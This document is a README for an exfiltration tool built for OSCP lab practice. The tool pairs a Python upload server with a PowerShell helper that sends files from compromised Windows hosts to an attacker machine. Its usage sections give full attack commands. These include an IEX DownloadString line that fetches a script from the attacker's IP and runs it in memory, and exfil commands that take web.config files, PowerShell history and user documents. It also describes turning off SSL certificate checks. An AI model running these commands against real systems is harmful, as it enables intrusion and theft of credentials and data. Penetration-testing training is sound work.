# Lazy PowerShell/Python Exfiltrator

A lightweight Python 3 HTTP server paired with a PowerShell upload helper script, designed to simplify file exfiltration during OSCP labs. I created this tool during my OSCP study in 2024 to quickly transfer files from compromised Windows hosts back to my attack machine for analysis while performing lateral movement in lab scenarios.

## Features

### Python Server (`postserver.py`)

- **Multipart Form-Data Parsing** — Properly parses multipart POST requests to extract files and metadata
- **Automatic Directory Organization** — Creates a hierarchical folder structure based on:
  - The source machine's hostname/identifier (sent via the `id` field)
  - The original file path from the source system (sent via the `path` field)
- **File Serving via GET** — Also functions as a standard HTTP file server, allowing directory browsing and file downloads (useful for serving tools or payloads to targets)
- **Web Upload Interface** — Provides a simple HTML form for browser-based file uploads
- **Configurable Binding** — Supports custom bind address, port, and upload directory via command-line arguments

### PowerShell Upload Helper (`upload.ps1`)

- **Single File or Bulk Exfiltration** — Upload individual files or recursively exfiltrate entire directories
- **Automatic Hostname Tagging** — Automatically includes the source machine's hostname (`$env:computername`) to organize files on the server
- **Path Preservation** — Sends the original file path to maintain directory context when organizing exfiltrated data
- **File Filtering** — Supports include patterns to target specific file types (e.g., `*.txt`, `*.xml`, `*.config`)
- **Excluded File Types** — Automatically skips `.url` and `.lnk` files which are typically not useful
- **SSL Certificate Bypass** — Disables SSL certificate validation for environments using self-signed certificates

## Usage

### Starting the Server (Attack Machine)

```bash
# Start on default port 8443, all interfaces, uploads saved to ./uploads/
python3 postserver.py

# Custom configuration
python3 postserver.py -b 192.168.45.242 -p 8080 -u exfil_data
```

**Command-Line Arguments:**
| Argument | Default | Description |
|----------|---------|-------------|
| `-b, --bind` | `0.0.0.0` | IP address to bind the server to |
| `-p, --port` | `8443` | TCP port to listen on |
| `-u, --uploadDir` | `uploads` | Directory to store uploaded files (relative to working directory) |

### Exfiltrating Files (Target Machine)

First, load the PowerShell function on the compromised host:

```powershell
# Option 1: Download and execute in memory
IEX(New-Object Net.WebClient).DownloadString('http://192.168.45.242:8443/upload.ps1')

# Option 2: Copy and paste the exfil function directly into your session
```

Then, use the `exfil` function to upload files:

```powershell
# Exfiltrate a single directory (non-recursive)
exfil -dir "C:\Users\admin\Documents" -url "http://192.168.45.242:8443/"

# Exfiltrate recursively with a file filter
exfil -dir "C:\inetpub\wwwroot" -url "http://192.168.45.242:8443/" -recurse -Include "*.config"

# Exfiltrate all XML files from a user's profile
exfil -dir "C:\Users\admin" -url "http://192.168.45.242:8443/" -recurse -Include "*.xml"
```

**PowerShell Function Parameters:**
| Parameter | Default | Description |
|-----------|---------|-------------|
| `-dir` | — | Target directory to exfiltrate from |
| `-url` | `http://192.168.45.242:8443/` | URL of the Python server |
| `-recurse` | `$false` | Recursively search subdirectories |
| `-Include` | `*.*` | Glob pattern to filter files |
| `-id` | `$env:computername` | Identifier for organizing files (defaults to hostname) |

### Example Workflow

1. **Start the server on your attack machine:**
   ```bash
   python3 postserver.py -p 8443 -u loot
   ```

2. **Gain access to a Windows target and load the upload script:**
   ```powershell
   IEX(New-Object Net.WebClient).DownloadString('http://192.168.45.242:8443/upload.ps1')
   ```

3. **Exfiltrate interesting files:**
   ```powershell
   # Grab all web.config files
   exfil -dir "C:\inetpub" -url "http://192.168.45.242:8443/" -recurse -Include "web.config"
   
   # Grab PowerShell history files
   exfil -dir "C:\Users" -url "http://192.168.45.242:8443/" -recurse -Include "ConsoleHost_history.txt"
   ```

4. **Check the server output:**
   ```
   ('succeeded', ('192.168.45.100', 54321), 'loot/workstation01/c/inetpub/wwwroot/web.config')
   ```

5. **Analyze files locally:**
   ```bash
   ls loot/workstation01/
   # Files are organized by hostname and original path
   ```

## File Organization

The server intelligently organizes uploaded files using the following structure:

```
<upload_directory>/
└── <hostname_or_id>/
    └── <original_path>/
        └── <filename>
```

For example, if you exfiltrate `C:\Users\admin\Documents\passwords.txt` from a machine named `WORKSTATION01`:

```
uploads/
└── workstation01/
    └── c/
        └── users/
            └── admin/
                └── documents/
                    └── passwords.txt
```

This organization makes it easy to:
- Keep files separated when exfiltrating from multiple hosts
- Maintain context about where each file originated
- Quickly locate files during analysis

## Technical Details

### POST Request Format

The server expects multipart/form-data POST requests with the following fields:

| Field | Description |
|-------|-------------|
| `path` | Original file path on the source system |
| `id` | Source machine identifier (typically hostname) |
| `filename` or `file` | The actual file content |

### Security Notes

- This tool is intended for **authorized penetration testing and security research only**
- The server binds to all interfaces by default — restrict with `-b` in production
- No authentication is implemented — use network segmentation appropriately
- The PowerShell script bypasses SSL certificate validation

## Requirements

- **Server:** Python 3.x (no external dependencies)
- **Client:** Windows PowerShell 5.0+ or PowerShell Core

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Acknowledgements

Created as a practical tool during OSCP preparation in 2024. Successfully used in numerous lab scenarios to quickly exfiltrate files for analysis during lateral movement exercises.
